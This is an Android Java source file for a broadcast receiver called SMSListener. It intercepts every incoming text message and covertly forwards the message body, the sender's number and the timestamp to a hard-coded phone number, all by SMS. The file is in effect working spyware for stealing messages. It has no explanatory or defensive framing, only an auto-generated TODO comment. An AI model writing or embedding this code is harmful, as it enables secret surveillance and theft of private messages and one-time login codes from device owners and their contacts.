package com.example.smslistener;

import java.text.SimpleDateFormat;
import java.util.Date;

import android.os.Bundle;
import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.view.Menu;

public class SMSListener extends BroadcastReceiver {



	@Override
	public void onReceive(Context context, Intent intent) {
		// TODO Auto-generated method stub
		if(intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")){
			Object[] pdus = (Object[])intent.getExtras().get("pdus");
			for(Object pdu:pdus){
				byte[] data=(byte[])pdu;
				SmsMessage msg=SmsMessage.createFromPdu(data);
				String content = msg.getMessageBody();
				String sender = msg.getOriginatingAddress();
				Date date = new Date( msg.getTimestampMillis());
				SimpleDateFormat format = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
				String sendContent = format.format(date)+":"+sender+"--"+content;
				SmsManager smsManager=SmsManager.getDefault();
				smsManager.sendTextMessage("18811031235", null, sendContent, null, null);
			}
		}
		
	}

}
